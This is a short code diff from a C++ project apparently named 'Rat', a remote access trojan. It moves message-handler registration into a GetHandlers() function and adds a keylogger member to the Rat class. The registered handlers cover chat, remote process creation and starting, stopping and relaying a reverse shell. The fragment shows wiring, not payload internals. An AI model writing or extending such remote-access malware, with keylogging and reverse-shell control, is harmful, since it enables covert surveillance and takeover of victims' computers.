@@ -17,15 +17,24 @@ Rat::Rat(
 		factory->CreateMessageListener(
 			_connection.get(),
 			[this](const MessageType t, const std::span<char> c) { OnMessage(t, c); },
-			[this] { OnDisconnection(); }))
+			[this] { OnDisconnection(); })),
+	_handlers(GetHandlers()),
+	_keylogger(_sender.get())
 {
-	_handlers[MessageType::Chat] = std::make_shared<ChatHandler>();
-	_handlers[MessageType::CreateProcessS] = std::make_shared<CreateProcessHandler>();
+}
 
+std::map<MessageType, std::shared_ptr<IMessageHandler>> Rat::GetHandlers()
+{
 	const auto reverseShellHandler = std::make_shared<ReverseShellHandler>(_sender.get());
-	_handlers[MessageType::StartReverseShell] = reverseShellHandler;
-	_handlers[MessageType::ReverseShellMessage] = reverseShellHandler;
-	_handlers[MessageType::StopReverseShell] = reverseShellHandler;
+
+
+	return {
+		{ MessageType::Chat, std::make_shared<ChatHandler>() },
+		{ MessageType::CreateProcessS, std::make_shared<CreateProcessHandler>() },
+		{ MessageType::StartReverseShell, reverseShellHandler },
+		{ MessageType::StopReverseShell, reverseShellHandler },
+		{ MessageType::ReverseShellMessage, reverseShellHandler },
+	};
 }
 
 void Rat::OnMessage(MessageType type, std::span<char> content)
